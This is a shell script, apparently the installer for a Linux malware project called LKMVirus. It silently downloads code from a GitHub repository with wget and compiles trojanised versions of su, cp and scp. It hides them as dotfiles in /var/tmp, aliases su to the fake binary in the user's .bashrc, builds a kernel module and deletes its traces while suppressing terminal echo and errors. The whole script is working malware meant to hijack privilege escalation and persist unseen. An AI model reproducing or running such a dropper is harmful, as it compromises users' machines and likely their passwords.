stty -echo
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/.infect.sh 2> .errlog
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_su.cpp 2> .errlog
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_cp.cpp 2> .errlog
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_scp.cpp 2> .errlog
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/hello.c 2> .errlog
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/Makefile 2> .errlog
wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/.recover.sh 2> .errlog
g++ fake_su.cpp -o .su 2> .errlog
g++ fake_cp.cpp -o .fake_cp 2> .errlog
g++ fake_scp.cpp -o .fake_scp 2> .errlog
mv -f .infect.sh /var/tmp/.infect.sh 2> .errlog
mv -f .su /var/tmp/.su 2> .errlog
mv -f .fake_cp /var/tmp/.fake_cp 2> .errlog
mv -f .fake_scp /var/tmp/.fake_scp 2> .errlog
cp -f /home/$USER/.bashrc /var/tmp/.originrc 2> .errlog
echo "alias su=/var/tmp/.su">>/home/$USER/.bashrc
source ~/.bashrc 2> .errlog
make all 2> .errlog 1> .errlog
cp -f hello.ko /var/tmp/.hello.ko 2> .errlog
rm -f fake_su.cpp fake_cp.cpp fake_scp.cpp Makefile .infect.sh recover.sh 2> .errlog
rm -f hello.c hello.ko hello.mod.o hello.o hello.mod.c Module.symvers modules.order 2> .errlog
rm -f .errlog
stty echo
